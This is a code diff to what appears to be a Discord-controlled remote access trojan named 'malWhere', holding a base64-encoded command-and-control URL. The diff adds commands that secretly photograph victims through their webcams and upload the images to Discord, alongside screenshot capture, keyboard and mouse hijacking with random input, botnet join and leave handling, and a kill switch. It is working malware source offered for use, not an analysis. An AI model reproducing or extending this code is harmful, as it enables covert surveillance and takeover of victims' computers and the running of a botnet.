@@ -11,8 +11,16 @@ import psutil
 import PIL
 from PIL import ImageGrab
 from functools import partial
-from scapy.all import ARP, Ether, srp
-conf.L3Socket= L3RawSocket; 
+import time
+import cv2
+import threading
+import sys
+import pathlib
+import random
+from datetime import datetime
+import shutil
+import string
+
 encryptedapi="aHR0cHM6Ly9nb2RzZXllLmZyZWUuYmVlY2VwdG9yLmNvbS8="
 base64_string =encryptedapi
 base64_bytes = base64_string.encode("ascii")
@@ -116,11 +124,12 @@ async def screenshot(ctx):
         await guild.create_text_channel(f"{ip4chan}-media")
       channel_id = existing_channel.id
       myScreenshot = pyautogui.screenshot()
-      myScreenshot.save(r'tempimage.png')
-      with open('tempimage.png', 'rb') as f:
+      myScreenshot.save(r'temp.png')
+      with open('temp.png', 'rb') as f:
         picture = discord.File(f)
         mediachan=malWhere.get_channel(channel_id)
         await mediachan.send(file=picture)
+        os.remove("temp.png")
         await ctx.message.delete()
   except Exception as e:
     await ctx.send(f"An Error Has Occured Please Try Again {e}")
@@ -191,9 +200,84 @@ async def botnet(ctx,status):
                 if botnet_flag==True:
                   botnet_flag=False
                   await botnet_channel.send(f"{ip} has left the botnet")
+    await ctx.message.delete() 
+  except Exception as e:
+    await ctx.send(f"An Error Has Occured Please Try Again {e}")
+    await ctx.message.delete()
+
+@malWhere.command()
+async def webcampic(ctx):
+  try:
+    if str(ctx.channel)==(ip4chan):
+      await ctx.message.delete()
+      existing_channel = discord.utils.get(ctx.guild.channels, name=f"{ip4chan}-media")
+      if not existing_channel:
+        await guild.create_text_channel(f"{ip4chan}-media")
+      channel_id = existing_channel.id
+      camera_port = 0
+      camera = cv2.VideoCapture(camera_port)
+      return_value, image = camera.read()
+      cv2.imwrite("temp.png", image)
+      del(camera)
+      mediachan=malWhere.get_channel(channel_id)
+      file = discord.File("temp.png", filename="temp.png")
+      await mediachan.send(file=file)
+      os.remove("temp.png")
+  except Exception as e:
+    await ctx.send(f"An Error Has Occured Please Try Again {e}")
+    await ctx.message.delete()
+
+@malWhere.command()
+async def hijack(ctx,keyboardormouse):
+  try:
+    if str(ctx.channel)==(ip4chan):
+      print(keyboardormouse)
+      if keyboardormouse=="keyboard":
+        await ctx.message.delete()
+        time.sleep(2)
+        start_time=0
+        end_time=90
+        while True:
+          if start_time <= end_time:
+            randint=random.randint(0,100)
+            randomstring=(string.ascii_lowercase+string.ascii_uppercase+string.ascii_letters+string.digits+string.punctuation)
+            pyautogui.write( ''.join(random.choice(randomstring) for i in range(randint)) )
+            start_time=start_time+1
+      else:
+        if keyboardormouse=="mouse":
+          await ctx.message.delete()
+          screen_size=pyautogui.size()
+          now=datetime.now()
+          start_time=0
+          end_time=90
+          while True:
+            if start_time <= end_time:
+              ycoord=random.randint(0,screen_size[0])
+              xcoord=random.randint(0,screen_size[1])
+              if pyautogui.onScreen(xcoord, ycoord):
+                pyautogui.moveTo(xcoord,ycoord)
+                start_time=start_time+1
+        
   except Exception as e:
     await ctx.send(f"An Error Has Occured Please Try Again {e}")
     await ctx.message.delete()
   await ctx.message.delete()
 
+@malWhere.command()
+async def kill(ctx):
+  try:
+    if str(ctx.channel)==(ip4chan):
+      global botnet_flag
+      botnet_channel=malWhere.get_channel(931748491078811698)
+      if botnet_flag==False:
+        pass
+      else:
+        if botnet_flag==True:
+          botnet_flag=False
+          await botnet_channel.send(f"{ip} has left the botnet")
+      await ctx.message.delete()
+      exit()
+  except Exception as e:
+    await ctx.send(f"An Error Has Occured Please Try Again {e}")
+    
 malWhere.run(TOKEN)
